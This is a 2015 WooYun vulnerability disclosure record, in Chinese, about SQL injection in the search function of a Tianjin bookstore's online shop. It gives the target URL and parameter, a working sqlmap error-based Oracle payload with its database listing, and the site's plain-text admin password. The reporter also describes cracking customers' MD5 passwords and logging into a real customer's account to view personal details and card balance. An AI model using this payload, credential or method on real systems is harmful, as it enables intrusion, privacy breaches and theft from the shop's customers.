{"id": 25148, "wybug_id": "wooyun-2015-0132713", "wybug_title": "天津图书大厦网上购书“天添网”可sql注入使6万多用户账户余额不保！", "wybug_corp": "天津图书大厦", "wybug_author": "未出现的风景", "wybug_date": "2015-08-10 17:25", "wybug_open_date": "2015-09-24 17:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["类型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-09-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 天津图书大厦网上购书“天添网”存在POST型SQL注入，可发现网站管理员admin密码为haochangdemima，以及注册用户敏感信息（包括用户名，密码，手机号，邮箱等等），虽然用户密码用了MD5加密，但是一堆堆的弱密码啊，cmd5解密好方便啊，一堆123456的密码。而绑定了“书香卡”的用户更惨了！钱随便被盗花啊。。。。 详细说明：  这个漏洞是在首页的【高级搜索】中！没有进行很好的过滤，看着不起眼儿，但是发现了就能进行注入了啊！\n\n输入一个单引号，报错了，发现是ORACLE数据库。\n\n\nPlace: POSTParameter: pm    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: pm=444' AND 9230=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(121)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9230=9230) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(111)||CHR(98)||CHR(113)||CHR(62))) FROM DUAL) AND 'JQYy' LIKE 'JQYy&flid=0---web application technology: Nginx, JSPback-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: pm    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: pm=444' AND 9230=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(121)||CHR(113)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (9230=9230) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(111)||CHR(98)||CHR(113)||CHR(62))) FROM DUAL) AND 'JQYy' LIKE 'JQYy&flid=0---web application technology: Nginx, JSPback-end DBMS: Oracleavailable databases [17]:[*] COLLEGE[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXCHANGE[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n减少篇幅，就放这一个列举数据库的代码啦。   漏洞证明：  \nhttp://www.tjbb.com/icarttw/search/searchdy (POST)pm=444&flid=0\n1.是DBA，但是oracle说不支持os-shell，我也没找到管理后台，新手一枚，还望大牛们指点\n\n2.管理员的密码是haochangdemima，让我在笑一会。。。\n\n3.有6万多注册用户呢\n\n4.这是用户信息，密码加密了\n\n5.用CMD5在线解密一下，就用第一个做实验了\n\n好弱的密码，后面连着那几个一样的都是1234566.用用户名密码登进去看一下好了\n\n地址啊什么的就都泄露了，然后书香卡还绑定了，虽然这个人的没啥钱，但是别的用户有啊，多危险！\n\n比如，下面这个！还有三百多块钱呢！能卖好多书吧，不知道电器能不能买。\n\n   修复方案：  我觉得好严重，难以信任的网购平台啊，赶快过滤吧。   版权声明：转载请注明来源 未出现的风景@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}